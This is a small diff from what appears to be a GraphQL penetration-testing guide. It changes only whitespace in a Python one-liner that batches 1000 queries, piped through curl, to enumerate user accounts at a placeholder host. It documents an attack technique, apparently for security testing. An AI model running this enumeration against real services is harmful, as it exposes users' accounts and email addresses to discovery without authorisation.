@@ -954,7 +954,7 @@ curl -s -X POST "https://api.target.com/graphql" \
 # Python to generate 1000 in one request (for user enumeration):
 python3 -c "
 import json
-ops = [{'query': f'{{ user(email: \"user{i}@target.com\") {{ id email }} }}'} for i in range(1000)]
+ops = [{'query': f'{{ user(email: \"user{ i }@target.com\") {{ id email }} }}'} for i in range(1000)]
 print(json.dumps(ops))
 " | curl -s -X POST "https://api.target.com/graphql" \
   -H "Content-Type: application/json" \
